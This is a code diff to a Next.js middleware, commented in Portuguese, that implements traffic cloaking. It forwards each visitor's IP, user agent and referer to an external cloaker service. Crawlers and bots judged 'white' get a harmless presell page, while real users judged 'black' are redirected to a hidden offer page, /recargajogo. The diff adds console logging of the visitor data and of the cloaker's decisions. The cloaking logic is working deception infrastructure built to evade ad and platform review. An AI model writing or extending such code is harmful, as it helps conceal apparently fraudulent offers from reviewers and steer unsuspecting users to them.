@@ -263,7 +263,14 @@ export async function middleware(request: NextRequest) {
       HTTP_SEC_CH_UA_PLATFORM: request.headers.get('sec-ch-ua-platform') || '',
     }
 
-    // Verificando acesso no cloaker
+    // 🔍 LOG: Verificando acesso no cloaker
+    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+    console.log('🔍 [CLOAKER] Verificando acesso')
+    console.log('   - URL:', CLOAKER_CONFIG.url)
+    console.log('   - IP:', clientIp)
+    console.log('   - User-Agent:', userAgent.substring(0, 100))
+    console.log('   - Referer:', referer)
+    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 
     // Fazer requisição para o cloaker (EXATAMENTE como o PHP)
     const formBody = new URLSearchParams(serverData as any).toString()
@@ -299,6 +306,14 @@ export async function middleware(request: NextRequest) {
       }
     }
 
+    // 📊 LOG: Resposta do cloaker
+    console.log('📊 [CLOAKER] Resposta recebida')
+    console.log('   - Type:', result.type)
+    console.log('   - URL:', result.url)
+    console.log('   - Result:', result.result || 'N/A')
+    console.log('   - Action:', result.action || 'N/A')
+    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+
     // Salvar no cache
     cloakerCache.set(cacheKey, {
       type: result.type,
@@ -314,10 +329,12 @@ export async function middleware(request: NextRequest) {
 
     // Se for "white" (bot/crawler), mostrar white page (/)
     if (result.type === 'white') {
+      console.log('⚪ [CLOAKER] WHITE PAGE - Mostrando presell')
       return NextResponse.next()
     }
 
     // Se for "black" (usuário real), REDIRECIONAR para /recargajogo com cookie
+    console.log('⚫ [CLOAKER] BLACK PAGE - Redirecionando para', CLOAKER_CONFIG.offerPagePath)
     
     // Criar URL sem barra final
     const redirectUrl = new URL(CLOAKER_CONFIG.offerPagePath, request.url)
